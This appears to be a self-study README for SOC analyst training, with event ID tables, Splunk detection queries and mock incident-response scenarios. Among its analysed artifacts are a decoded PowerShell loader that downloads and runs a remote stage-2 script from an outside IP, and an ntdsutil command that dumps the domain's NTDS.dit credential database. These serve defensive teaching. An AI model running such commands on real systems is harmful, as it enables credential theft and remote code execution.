# 🛡️ SOC Analyst Bootcamp — 20-Day Self-Study Plan

**Type:** Self-directed study | **Focus:** Blue Team / SOC Operations  
**Duration:** 20 Days | **Status:** 🟡 In Progress (Day 7/20) | Interview Prep Track Active

> Built as part of my preparation for SOC Analyst (L1/L2) roles alongside an active internship at the Kerala Police Cybercrime Unit.

---

## 🎯 Objective

To build job-ready SOC Analyst (L1/L2) skills through structured daily study covering
real-world tools, techniques, and scenarios used in Security Operations Centers.

---

## 📅 Progress Tracker

| Day | Topic | Status |
|-----|-------|--------|
| Day 1 | Windows Event Logs & Key Event IDs | ✅ Done |
| Day 2 | Logon Types, Persistence Mechanisms & MITRE ATT&CK Mapping | ✅ Done |
| Day 3 | Cyber Kill Chain & Attack Frameworks | ✅ Done |
| Day 4 | Network Traffic Analysis with Wireshark | ✅ Done |
| Day 5 | SIEM Basics & Splunk Fundamentals 1 | ✅ Done |
| Day 6 | Alert Triage & Escalation Workflow | ✅ Done |
| Day 7 | Mock Incident Response Scenarios (x5) + Extended Interview Prep (x2) | ✅ Done |
| Day 8 | Phishing Email Analysis | ⬜ Upcoming |
| Day 9 | Malware Behaviour Analysis (Static) | ⬜ Upcoming |
| Day 10 | Malware Behaviour Analysis (Dynamic) | ⬜ Upcoming |
| Day 11 | Threat Intelligence & IOC Hunting | ⬜ Upcoming |
| Day 12 | Endpoint Detection & Response (EDR) | ⬜ Upcoming |
| Day 13 | Memory Forensics Basics | ⬜ Upcoming |
| Day 14 | Incident Response Lifecycle | ⬜ Upcoming |
| Day 15 | SOC Playbooks & Runbooks | ⬜ Upcoming |
| Day 16 | Active Directory Attacks & Detection | ⬜ Upcoming |
| Day 17 | Cloud Security Monitoring (Azure/AWS) | ⬜ Upcoming |
| Day 18 | CTF — TryHackMe SOC Level 1 | ⬜ Upcoming |
| Day 19 | CTF — LetsDefend Practice Alerts | ⬜ Upcoming |
| Day 20 | Final Review & Mock SOC Scenario | ⬜ Upcoming |

---

## 📚 Topics Covered

### ✅ Day 1 — Windows Event Logs & Key Event IDs

- Windows Event Log structure and log types
- Key Event IDs every SOC analyst must know

| Event ID | Description |
|----------|-------------|
| 4624 | Successful logon |
| 4625 | Failed logon |
| 4648 | Logon with explicit credentials |
| 4672 | Special privileges assigned |
| 4688 | New process created |
| 4698 | Scheduled task created |
| 4720 | User account created |
| 4732 | User added to privileged group |
| 4740 | Account locked out |
| 7045 | New service installed |

---

### ✅ Day 2 — Logon Types, Persistence & MITRE ATT&CK

**Logon Types**

| Type | Name | Description | Red Flag Condition |
|------|------|-------------|-------------------|
| 2 | Interactive | Local keyboard login | Normal for workstations |
| 3 | Network | SMB, file shares, WinRM | Admin account on DC from unknown host |
| 4 | Batch | Scheduled tasks | Unexpected on sensitive servers |
| 5 | Service | Service starting under account | Unusual service account on critical system |
| 7 | Unlock | Workstation unlock | Normal |
| 10 | RemoteInteractive | RDP session | From external IP or non-admin user |
| 11 | CachedInteractive | Offline cached credentials | Normal for laptops offline |

**Persistence Mechanisms & MITRE Mappings**

| Technique | MITRE ID | Detection |
|-----------|----------|-----------|
| Scheduled Tasks | T1053.005 | Event ID 4698 |
| Registry Run Keys | T1547.001 | Registry monitoring |
| Startup Folder | T1547.001 | File system monitoring |
| New Service Creation | T1543.003 | Event ID 7045 |
| PowerShell Profile | T1546.013 | PowerShell logging |

**Parent-Child Process Red Flags**

| Process | Legitimate Parent | Suspicious Parent |
|---------|------------------|-------------------|
| svchost.exe | services.exe | explorer.exe, cmd.exe, any user process |
| powershell.exe | explorer.exe, cmd.exe | WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE |
| cmd.exe | explorer.exe | Office applications |
| lsass.exe | wininit.exe ONLY | Any other parent |

---

### ✅ Day 3 — Cyber Kill Chain & Attack Frameworks

**Cyber Kill Chain — 7 Stages**

| Stage | Description | L1 Detection Point |
|-------|-------------|-------------------|
| 1. Reconnaissance | Attacker gathers intel on the target | Threat intel feeds |
| 2. Weaponization | Crafting malware and exploit payloads | Sandbox analysis |
| 3. Delivery | Phishing emails, USB drops, watering holes | Email gateway, AV scan |
| 4. Exploitation | Triggering the vulnerability | EDR alerts, 4688 |
| 5. Installation | Malware establishes persistence | 7045, 4698, EDR |
| 6. Command & Control | Attacker maintains remote access | SIEM outbound, proxy/DNS |
| 7. Actions on Objectives | Data theft, ransomware, disruption | DLP, file access, SIEM |

> **L1 is most active at stages 3, 5, 6, and 7.**  
> When you see Stage 5 (Installation) — Stage 6 (C2) is seconds away. Contain immediately.

---

### ✅ Day 4 — Network Traffic Analysis with Wireshark

- TCP 3-way handshake and half-open connections (SYN flood detection)
- Common ports and their attack relevance

| Port | Service | Attack Risk |
|------|---------|-------------|
| 22 | SSH | Brute force |
| 25 | SMTP | Email spoofing |
| 53 | DNS | DNS exfiltration, poisoning |
| 80/443 | HTTP/HTTPS | C2 over web traffic |
| 445 | SMB | Lateral movement, ransomware spread |
| 3389 | RDP | Brute force, remote intrusion |

- Firewall vs IDS vs IPS — difference, placement, log types generated
- DNS poisoning and ARP spoofing detection patterns

---

### ✅ Day 5 — SIEM Basics & Splunk Fundamentals 1

**Core Splunk SPL Queries**

```spl
# Failed logins in last 24h — brute force detection
index=windows EventCode=4625 earliest=-24h
| stats count by src_ip, Account_Name
| where count > 5
| sort -count

# Success after failures (same source) — confirmed intrusion
index=windows (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
         count(eval(EventCode=4624)) as successes by src_ip
| where failures > 10 AND successes > 0

# Fake svchost — masquerading detection
index=windows EventCode=4688
| search Process_Name=*svchost* AND NOT
  New_Process_Name="C:\\Windows\\System32\\svchost.exe"
| table _time, host, Creator_Process_Name, New_Process_Name

# Outbound C2 connection check
index=network dest_ip=<suspicious_ip>
| stats sum(bytes_out) as total_bytes by src_ip, dest_port
| eval MB=round(total_bytes/1024/1024,2)
| table src_ip, dest_port, MB
```

**SIEM Concepts**
- Log aggregation, correlation, alerting, dashboards
- Use case tuning — reducing false positives without missing true positives
- Severity ratings are starting points — analyst judgment determines final severity

---

### ✅ Day 6 — Alert Triage & Escalation Workflow

**Escalation Brief Formula: WHO → WHAT → WHEN → WHERE → IMPACT → DONE → NEED**

Example:
> *"Source IP 185.220.101.45, known Tor exit node, brute-forced CORP-DC01 via RDP —
> 87 failures then success at 02:51 AM as Administrator, Logon Type 10. DC01 is prod
> domain controller. AbuseIPDB: 97% abuse score. Lateral movement confirmed to FS01
> via svc_backup. Both hosts isolated via EDR. Recommend forensic imaging.
> Do I have approval to engage IR team?"*

**Severity Upgrade Rules**
- Target is Domain Controller, Finance server, or Executive endpoint → upgrade immediately
- Source IP confirmed malicious on AbuseIPDB / VirusTotal → upgrade
- Successful logon follows cluster of failures → upgrade
- Departing employee + sensitive file types → upgrade
- Privileged account behaving abnormally → upgrade

**Incident Ticket Structure**
Ticket ID: INC-YYYY-XXXX
Type: [Brute Force / Intrusion / Phishing / Ransomware / Insider / Priv Esc]
Severity: Critical / High / Medium / Low
Priority: P1 / P2 / P3
Status: Detected → Triaged → Contained → Eradicated → Closed
Assigned To: [L2 Name]
Opened: HH:MM | Contained: HH:MM | Closed: HH:MM
Actions Taken (timestamped — mandatory):
02:47 — Alert triggered in SIEM. L1 triage initiated.
02:48 — Source IP checked on AbuseIPDB. 97% score, confirmed Tor exit node.
02:50 — Event ID 4624 success confirmed. Escalated to L2 [Name].
02:55 — Isolation approved. EDR isolation applied to CORP-DC01.

---

### ✅ Day 7 — Mock Incident Response Scenarios

> Five high-pressure SOC L1 scenarios practised end-to-end — triage, investigation,
> containment, escalation brief, and documentation. Scenarios covered: Brute Force RDP,
> BEC Phishing, Insider Threat, Ransomware Propagation, and Privilege Escalation via
> Compromised Web Server. Each mirrors real-world alert conditions in a 24×7 SOC environment.

---

#### 🔴 Scenario 01 — Brute Force RDP on Domain Controller

**Primary Tactic: Initial Access → Credential Access → Lateral Movement**

**Alert Fired:**
[HIGH] Brute Force Detected
Source IP: 185.220.101.45
Target: CORP-DC01 (Domain Controller)
Event ID: 4625 — Failed Logon
Count: 87 failed attempts in 6 minutes
Account targeted: administrator
Protocol: RDP (Port 3389)
Time: 02:45 AM

**Severity Upgrade:** HIGH → CRITICAL (Domain Controller + confirmed Tor exit node + successful logon)

**Investigation Steps:**
1. **Triage first — do not escalate blind.** L2's first question is "What do you have?" Enrich before you call.
2. AbuseIPDB: 185.220.101.45 — 97% abuse confidence, confirmed Tor exit node
3. Check for 4624 immediately after the 4625 cluster — success after failure = confirmed intrusion
4. Event ID 4624 found: `administrator` logon from same IP at 02:51 AM, Logon Type 10 (RDP)
5. Lateral movement detected at 02:53 — `svc_backup` logged into CORP-FS01 from DC01, Logon Type 3

**First 3-Minute Enrichment Checklist:**

| Source | What to Pull |
|--------|-------------|
| SIEM | Has this IP appeared in other alerts today? Other targets? |
| AbuseIPDB / VirusTotal | Known Tor exit node, scanner, or botnet? |
| CMDB / Asset inventory | What is CORP-DC01? Who owns it? Production? |
| DC01 recent logs | Any 4624 successes? New accounts (4720)? Privilege escalation (4672)? |

**Escalation Brief (30 seconds):**
> *"Escalating a confirmed intrusion. Source IP 185.220.101.45, known Tor exit node,
> brute-forced CORP-DC01 via RDP — 87 failed attempts from 02:45, successful login at
> 02:51 as Administrator, Logon Type 10. DC01 is production domain controller. No prior
> alerts on this IP today, lateral movement to FS01 now confirmed via svc_backup at 02:53.
> I recommend isolating DC01 and FS01 now. Do I have your approval?"*

**Key Rule — Re-escalate when the situation changes:**
> L2 said "observe, don't isolate." Two minutes later lateral movement confirmed.
> Situation has materially changed — re-escalate immediately with new findings and a
> clear recommendation. Never silently override L2, never blindly follow an outdated instruction.

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Brute Force: Password Guessing | T1110.001 |
| Remote Services: RDP | T1021.001 |
| Lateral Movement via Valid Accounts | T1078 |

**Sample Incident Ticket — Filled:**
Ticket ID: INC-2024-0847
Type: Brute Force + Confirmed Intrusion + Lateral Movement
Severity: Critical
Priority: P1
Status: Contained — pending L2 eradication review
Assigned To: [L2 Name]
Opened: 02:47 AM | Contained: 02:58 AM
Actions Taken:
02:47 — Alert triggered in SIEM. L1 triage initiated.
02:48 — Source IP 185.220.101.45 queried on AbuseIPDB. Confirmed Tor exit node, 97% score.
02:50 — Event ID 4624 identified. Successful RDP login as Administrator on CORP-DC01.
02:51 — Escalated to L2 [Name]. Decision: observe, do not isolate.
02:53 — Lateral movement detected. svc_backup logged into CORP-FS01 from DC01, Logon Type 3.
02:54 — Re-escalated to L2 with recommendation to isolate. Approval granted.
02:55 — CORP-DC01 and CORP-FS01 isolated from network by L2.
02:58 — Isolation confirmed. No further lateral movement detected.

**Key Lessons:**
- Triage before escalation — "I just got the alert" wastes L2's time
- Re-escalate when the situation changes — outdated instructions don't apply to new facts
- Timestamps on every action, every escalation attributed — this is what survives an audit

---

#### 🟠 Scenario 02 — BEC Phishing: Finance Executive Compromise

**Primary Tactic: Initial Access → Execution → Command & Control**

**Alert Fired:**
[MEDIUM] Suspicious Outbound Connection
Host: FIN-PRIYA-L01
Destination IP: 91.195.240.117
Port: 443
Time: 10:09 AM
Data transferred: 2.3 MB outbound

User report: Finance executive Priya Nair received CEO impersonation email requesting
urgent $85,000 wire transfer. She did not transfer funds but clicked a link in the email
to view an "invoice." She reports nothing happened when she clicked.

**Severity Upgrade:** MEDIUM → HIGH/CRITICAL

**Why MEDIUM is wrong — full reasoning:**
- Target is a Finance executive — highest-value phishing target, access to payment systems
- BEC pattern — CEO impersonation + urgent wire request is textbook Business Email Compromise
- "Nothing happened" = malware working silently, not a clean click
- 2.3 MB outbound on port 443 immediately after a suspicious click = C2 or data exfil indicator
- Timing — SIEM alert at 10:09, Priya clicked at ~10:08. Direct correlation
- AbuseIPDB on 91.195.240.117 → 97% abuse confidence, flagged for malware C2 by 43 reporters

**Investigation Steps:**
1. Event ID 4688: `OUTLOOK.EXE` → `powershell.exe -EncodedCommand [Base64]`
   - `-EncodedCommand` = Base64 obfuscation (T1027) — evades keyword-based detection
   - Decoded payload: `IEX (New-Object Net.WebClient).DownloadString(...)` — fileless stage-2 loader
2. Fake `svchost.exe` found in process list:
   - Path: `C:\Users\Priya\AppData\Local\Temp\svchost.exe` ❌
   - Parent: `explorer.exe` ❌
   - Active connection to 91.195.240.117:443
   - Real path: `C:\Windows\System32\svchost.exe` | Real parent: `services.exe`
   - MITRE T1036 — Masquerading

**Handling the User:**
> ❌ Do NOT say "your system might be compromised" — user may panic, restart the laptop,
> destroying volatile memory.  
> ✅ Say: *"Priya, we're seeing something on our network we need to check. Can I grab your
> laptop for 10 minutes? It's routine."* Get the device first, no details.

**Investigation Priority Order:**
1. **Laptop first** — volatile evidence. Running processes and memory vanish on restart.
2. **C2 connection second** — is the beacon still active? Has it received commands?
3. **Email last** — sitting preserved on the mail server, won't disappear.

**Kill Chain Position:** Stage 5 (Installation) → Stage 6 (C2) — 60-second window

**Containment (in order):**
1. Block C2 IP at perimeter firewall — protects all endpoints simultaneously
2. Isolate endpoint via EDR
3. Memory dump before shutdown — `IEX` is fileless, no disk artifacts
4. DNS/proxy logs — check if any other hosts have contacted same C2

**Escalation Brief:**
> *"Started as medium, upgraded to High — C2 confirmed and BEC context. Finance exec
> Priya Nair clicked a phishing link at 10:08. SIEM shows 2.3 MB outbound to
> 91.195.240.117 at 10:09, AbuseIPDB 97% confidence C2 infrastructure. Process list
> shows fake svchost.exe in AppData\Temp with active connection to that IP, parent
> explorer.exe — confirmed T1036 masquerading. Laptop isolated via EDR. Recommending
> full forensic imaging before reimaging. Do you want me to engage the IR team?"*

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Phishing: Spearphishing Link | T1566.002 |
| PowerShell | T1059.001 |
| Obfuscated Files or Information | T1027 |
| Masquerading | T1036 |
| C2 over HTTPS | T1071.001 |

**Key Lessons:**
- Block C2 at firewall FIRST — one rule protects all endpoints
- `IEX` = fileless execution — memory dump is the only forensic artifact
- "Nothing happened when I clicked" = malware working silently

---

#### 🟡 Scenario 03 — Insider Threat: Departing Employee Data Exfiltration

**Primary Tactic: Collection → Exfiltration**

**Alert Fired:**
[MEDIUM] Unusual Data Transfer
User: rajesh.kumar — R&D Department
Destination: personal.dropbox.com
Files: 47 files — 1.2 GB (.dwg, .pdf, .docx)
HR Status: Last working day TODAY

**Severity Upgrade:** MEDIUM → CRITICAL

**DLP History:**
| Date | Files | Size | Notes |
|------|-------|------|-------|
| Monday | 23 | 340 MB | Below DLP threshold |
| Wednesday | 31 | 560 MB | Below DLP threshold |
| Friday | 47 | 1.2 GB | Final bulk transfer |

MITRE T1030 — deliberately staying below DLP thresholds. Escalating volume = premeditated exfiltration.

**Why .dwg matters — say this explicitly in the brief:**
> `.dwg` = AutoCAD engineering drawings — product schematics, blueprints, core IP.
> This is not a document leak. This is potential trade secret theft.

**Who NOT to contact:**
- ❌ Rajesh Kumar — tips him off, Dropbox deleted, evidence lost
- ❌ His direct manager — could warn him
- ❌ HR executive who processed resignation — could be compromised or leak it

**Correct escalation path:** SOC L2 → Senior Legal/HR leadership → CISO only

**Evidence to Preserve (before 5 PM auto-revocation):**

| Source | What to Collect |
|--------|----------------|
| Endpoint (RND-RAJESH-L04) | Process history, browser history, USB activity, recently accessed files |
| Active Directory | Full 30-day login history, after-hours access, folder permissions |
| DLP system | Full transfer history, previous policy violations |
| Email logs | Any forwards to personal accounts |

> Chain of custody starts at first evidence collection — timestamp everything,
> log who collected it and where it's stored.

**CISO-Level Brief (impact-first):**
> *"R&D intellectual property including engineering drawings may have been exfiltrated
> by a departing employee over a 5-day period. Rajesh Kumar transferred .dwg AutoCAD
> files, PDFs, and documents totalling 2.1 GB to personal Dropbox across three sessions —
> Monday 340MB, Wednesday 560MB, Friday 1.2GB — deliberately staying below DLP thresholds
> each time. His resignation was accepted two weeks ago. This is premeditated IP theft, not
> accidental data loss. Recommended immediate actions: suspend access before 5 PM auto-revocation,
> preserve forensic image of his endpoint, engage Legal to initiate Dropbox subpoena and assess
> trade secret exposure. Do not contact Rajesh until Legal advises."*

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Data Transfer Size Limits | T1030 |
| Exfiltration to Cloud Storage | T1567.002 |

**Key Lessons:**
- Incremental transfer pattern across days = T1030, premeditation = Critical
- `.dwg` files = AutoCAD = trade secret territory — name it explicitly in the brief
- Chain of custody starts at first evidence collection
- Insider threat escalation path is different — Legal and CISO, not just L2

---

#### 🔴 Scenario 04 — Ransomware: Network Propagation via Shared Drive

**Primary Tactic: Initial Access → Execution → Impact → Lateral Movement**

**Alert Fired:**
[HIGH] Mass File Modification
Host: HR-MEENA-L07
Files: 2,847 changed to .locked in 4 minutes
Location: \CORP-FILESERVER\HR
Time: 11:38 AM
User report: "I opened an email attachment and now there's a Bitcoin message on my screen"

**Spread Detected:**
HR-MEENA-L07  — 11:38 AM  ← patient zero
FIN-SARA-L02  — 11:41 AM
RND-AHMED-L09 — 11:43 AM
3 departments in 5 minutes = SMB propagation via shared file server (T1021.002)

**First 30 seconds — the only thing that matters:**
> Tell Meena: *"Do not restart, do not click anything, step away from the laptop."*
>
> Restarting destroys volatile memory — encryption keys potentially recoverable from RAM
> are lost forever. Get the user off the machine before anything else.

**Containment Order:**
1. Isolate HR-MEENA-L07 via EDR — stops encrypted file writes to the file server
2. Check SIEM — how many hosts are actively encrypting right now?
3. Escalate to L2 simultaneously — this is big enough that L2 needs to know now
4. Isolate FIN-SARA-L02 and RND-AHMED-L09 via EDR
5. **Take CORP-FILESERVER offline** — the spread mechanism, not just the endpoints
6. Memory dump on patient zero before anything is powered down

> ⚠️ The most commonly missed action: taking the file server offline.
> Individual endpoint isolation is not enough when the spread vector is a shared network drive.

**Patient Zero Investigation:**
| Source | What to Find |
|--------|-------------|
| Email server logs | Malicious attachment delivered to Meena just before 11:38 |
| Attachment analysis | File extension (.exe, .xlsm, .zip), SHA256 hash → VirusTotal |
| EDR process tree | Macro spawning encryptor process chain |
| Email headers | Spoofed sender domain, mismatched reply-to |
| Network/proxy logs | Outbound connections immediately after delivery |

> ⚠️ Evidence capture lesson: If you don't screenshot Meena's screen before containment,
> you lose that visual evidence. Capture what you can see in real time — the email,
> the ransom note, the screen state — before isolating.

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Phishing: Spearphishing Attachment | T1566.001 |
| Data Encrypted for Impact | T1486 |
| SMB Lateral Movement | T1021.002 |

**Key Lessons:**
- File server offline = the containment action most analysts miss
- Containment ≠ Eradication — full network sweep before any restoration
- Check double extortion: did ransomware exfiltrate before encrypting?
- Blast Radius = Data Sensitivity × Network Reachability × Account Privilege

---

#### 🟠 Scenario 05 — Privilege Escalation via Compromised Web Server

**Primary Tactic: Credential Access → Privilege Escalation → Persistence**

**Alert Fired:**
Event ID 4720 — New account: svc_healthmonitor
Created by: john.matthews (IT Support — no AD admin rights)
Event ID 4732 — svc_healthmonitor added to Domain Admins
Host: CORP-DC01
Time: 09:01 AM

**Investigation:**
- Event ID 4624 for john.matthews sourced from CORP-WEB01 (web server), Logon Type 10
- John's assigned workstation: CORP-JOHN-PC01 — CORP-WEB01 is not his machine
- No change ticket found — unauthorised action confirmed

**Attack Chain:**
CORP-WEB01 compromised
↓ T1552 — credentials stolen from web server
john.matthews credentials used (T1078.002)
↓ T1021.001 — RDP pivot to DC01
CORP-DC01 accessed
↓ T1136.002 — backdoor domain account created
svc_healthmonitor → Domain Admins (T1098)

**Containment Order — account first, device second:**
1. **Disable svc_healthmonitor in AD** — the account is the weapon; neutralise it first
2. Reset john.matthews password — forces attacker out of any active sessions
3. Isolate CORP-WEB01 via EDR — the initial compromise point
4. Collect volatile evidence from WEB01
5. Audit full Domain Admins group — svc_healthmonitor may not be the only backdoor
6. Pull 4624 for svc_healthmonitor across all hosts — did it log into anything in the 4-minute window?

> ⚠️ Do NOT delete svc_healthmonitor — disable only.
> Deletion destroys the account SID, creation timestamp, and group membership records
> which are all forensic evidence for Legal and post-incident review.

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Valid Accounts: Domain | T1078.002 |
| Remote Services: RDP | T1021.001 |
| Create Account: Domain | T1136.002 |
| Account Manipulation | T1098 |
| Unsecured Credentials | T1552 |

**Key Lessons:**
- In identity attacks: disable the account BEFORE isolating the device
- Never DELETE malicious accounts — disable only (forensic evidence)
- Always verify against change tickets before acting on AD alerts
- Logon Type 10 from a server = pivot point, not legitimate use

---

### ✅ Day 7 Extended — Interview Drills: Credential Access & Fileless Execution

> Two additional high-pressure interview drills run after the core five scenarios.
> Focused on Event ID analytical depth, NTDS credential dumping, valid account abuse,
> and fileless malware triage.

---

#### 🔴 Extended Scenario 01 — NTDS Credential Dump on Domain Controller

**Primary Tactic: Credential Access → Exfiltration**

**Alert Chain:**
06:44 AM — Event ID 4625 × 3 failures | Account: Administrator | Source: 10.0.0.44 | Logon Type: 3
06:49 AM — Event ID 4624 success      | Account: Administrator | Source: 10.0.0.44 | Logon Type: 3
06:51 AM — Event ID 4688              | Creator: cmd.exe | New Process: ntdsutil.exe
Command: ntdsutil "ac i ntds" "ifm" "create full c:\temp\dump" q q

**Why 3 failures on DC01 is not noise:**
- Target is the built-in Administrator account on a Domain Controller
- Built-in Administrator on a DC should almost never appear via network Logon Type 3
- Internal source IP (10.0.0.44) needs investigation — legitimate admin box or compromised internal machine?
- Asset criticality overrides low failure count

**What ntdsutil "create full c:\temp\dump" is doing:**
> This is an NTDS.dit database dump — not metadata cleanup.
> NTDS.dit is the Active Directory database: every user account, every password hash,
> every Kerberos key in the entire domain. Dumped to a temp folder = staged for exfiltration.
> If successful, the attacker can crack every password offline and own the entire organisation
> without ever logging in again.
>
> MITRE T1003.003 — OS Credential Dumping: NTDS  
> Every credential in the domain must be treated as compromised.

**Event IDs to pull after 4624 success on DC01 — in priority order:**

| Event ID | Why — not just what |
|----------|---------------------|
| 4672 | Did this session receive admin-level privileges? Confirms full scope of access. |
| 4688 | What processes ran after login? CMD, PowerShell, mimikatz — this is your attack chain. |
| 4698 | Did they create a scheduled task for persistence before anything else? |
| 4634 | Session end — useful for timeline reconstruction, not your first move. |

**Scheduled Task Red Flags — 3 specific indicators:**
Task Name:  \Microsoft\Windows\UpdateHealth   ← designed to look legitimate
Action:     C:\Users\Public\svchost.exe       ← world-writable folder, never a real Windows path
Created By: NT AUTHORITY\SYSTEM at 11:23 PM  ← SYSTEM creating new tasks at night = prior compromise

> If NT AUTHORITY\SYSTEM is creating tasks, something already running as SYSTEM planted it.
> That means there is a prior compromise you haven't found yet — work backwards.

**Escalation Brief:**
> *"Confirmed credential dump on CORP-DC01. Internal host 10.0.0.44 brute-forced the
> built-in Administrator account via network logon, authenticated at 06:49, immediately
> ran ntdsutil to dump the full NTDS.dit to C:\temp\dump. That's every password hash in
> the domain. Rating this Critical. Need approval to isolate DC01 and 10.0.0.44. Recommend
> treating this as a full domain compromise — every credential needs rotation. Do I have your go-ahead?"*

**Valid Account Detection — the hardest L1 scenario:**
Event ID: 4624
Account: svc_sqlbackup
Source Host: CORP-WEB01
Target Host: CORP-DB01
Logon Type: 3
Times: Mon 01:43 | Tue 03:12 | Wed 02:58 | Thu 02:17
AV: Clean | Failed logins: None | Account: Legitimate

> ⚠️ "Everything looks clean" is not an answer. This is MITRE T1078 — Valid Accounts.
> Attackers operating with legitimate credentials inside normal infrastructure is the
> hardest attack to catch — and the most common L1 failure mode.

**Red flags in this clean-looking alert:**
- Randomised timing — legitimate scheduled tasks run at fixed times. Randomisation is a deliberate attacker technique to evade time-based detection rules
- Web server authenticating to database server — backups typically run from a dedicated backup server, not the web tier
- Pattern started this week — if svc_sqlbackup is 2 years old but this behaviour started Monday, something changed Monday

**How to prove benign vs malicious:**
| To prove benign | To prove malicious |
|----------------|-------------------|
| Check documented purpose — should it run from WEB01? | Pull 4688 on WEB01 around each logon time — what process initiated this? |
| Pull task scheduler on WEB01 — registered task? | Has svc_sqlbackup accessed anything beyond DB01 this week? |
| Verify with DBA team — do they have a matching backup job? | Check 4698 on WEB01 — was a new task created recently? |
| Check DB01 activity — legitimate backup = large read activity | Pull WEB01 compromise history — any alerts in last 2 weeks? |

---

#### 🔴 Extended Scenario 02 — Fileless Malware via Phishing (Marketing Executive)

**Primary Tactic: Initial Access → Execution → Privilege Escalation → C2**

**Alert Chain:**
14:13 — Event ID 4624  | Account: sarah.thomas | Host: CORP-SARAH-PC01 | Logon Type: 2
14:13 — Event ID 4672  | Account: sarah.thomas | Privileges: SeDebugPrivilege,
SeImpersonatePrivilege,
SeTcbPrivilege
14:11 — Event ID 4688  | Creator: OUTLOOK.EXE | New Process: powershell.exe
Command: powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBuAHYAbwBr...

**Why 4672 on a marketing executive is Critical:**
> SeDebugPrivilege, SeImpersonatePrivilege, and SeTcbPrivilege together = near-SYSTEM level access.
> A marketing executive has no legitimate reason for any of these three privileges.
> Her account is either compromised or malware running under her session performed privilege escalation.

**What -EncodedCommand actually means:**
> `-EncodedCommand` accepts a Base64-encoded string and executes it as PowerShell at runtime.
> The long string in the logs is not a hash — it is Base64-encoded PowerShell code that
> decodes and runs in memory. Attackers use it to evade signature-based detection: tools
> scanning for keywords like `Invoke-Mimikatz` or `DownloadString` see nothing in plain text.
>
> MITRE T1027 — Obfuscated Files or Information
>
> To decode in a sandbox:
> ```powershell
> [System.Text.Encoding]::Unicode.GetString(
> [System.Convert]::FromBase64String('SQBuAHYAbwBrAGUA...'))
> ```

**Decoded payload:**
```powershell
IEX (New-Object Net.WebClient).DownloadString(
    'http://185.220.101.12/stage2/payload.ps1')
```

> `IEX` = Invoke-Expression — executes whatever string is passed to it at runtime.
> This command downloads a second-stage payload and executes it entirely in memory.
> No file is written to disk. Traditional forensics finds nothing.

**Kill Chain position:**
Stage 1–4 ✓ Done (recon, weaponize, delivery, exploitation — Outlook macro)
Stage 5   → HAPPENING NOW (stage2/payload.ps1 downloading)
Stage 6   → SECONDS AWAY (payload will beacon out)
Stage 7   → NOT YET — but imminent

**Four immediate actions — 60-second window:**
1. **Block 185.220.101.12 at perimeter firewall** — one rule protects all endpoints simultaneously
2. **Isolate CORP-SARAH-PC01 via EDR** — cuts this machine while firewall covers everyone else
3. **Memory dump immediately** — IEX executes in memory only; payload.ps1 never touches disk; memory dump is the only forensic artifact
4. **Pull DNS and proxy logs** — check if any other hosts have contacted this IP; hunt for lateral spread before it becomes an outbreak

**MITRE ATT&CK:**
| Technique | ID |
|-----------|-----|
| Phishing: Spearphishing Attachment | T1566.001 |
| PowerShell | T1059.001 |
| Obfuscated Files or Information | T1027 |
| Abuse Elevation Control Mechanism | T1548 |
| C2 over HTTP | T1071.001 |

**Key Lessons:**
- SeDebugPrivilege + SeImpersonatePrivilege + SeTcbPrivilege on a non-admin = immediate Critical
- `-EncodedCommand` is Base64 obfuscation, not a hash — know the difference
- IEX = fileless execution — memory dump is your only evidence
- Block at firewall first, isolate endpoint second — order matters when you have seconds

---

## 🧰 Tools & Platforms

`Windows Event Viewer` `Wireshark` `Splunk` `Microsoft Sentinel`  
`MITRE ATT&CK Navigator` `TryHackMe` `LetsDefend` `Hack The Box`  
`AbuseIPDB` `VirusTotal` `EDR (CrowdStrike / Microsoft Defender)`

---

## 🏆 Certifications Running Alongside

| Certification | Platform | Status |
|---------------|----------|--------|
| SOC Fundamentals | LetsDefend × HackTheBox | ✅ Completed |
| CEH | EC-Council | 🟡 In Progress |
| SOC Analyst Bootcamp (Self-directed) | GitHub | 🟡 In Progress — Day 7/20 |

---

## 📌 Related Projects

- [Web Application VAPT Report](https://github.com/AleenaRoseGeorge/web-application-pentest-report)
- [Cyber Forensics Internship](https://github.com/AleenaRoseGeorge/cyber-forensics-internship)

---

*Built in public. Updated daily. Every mistake documented.*
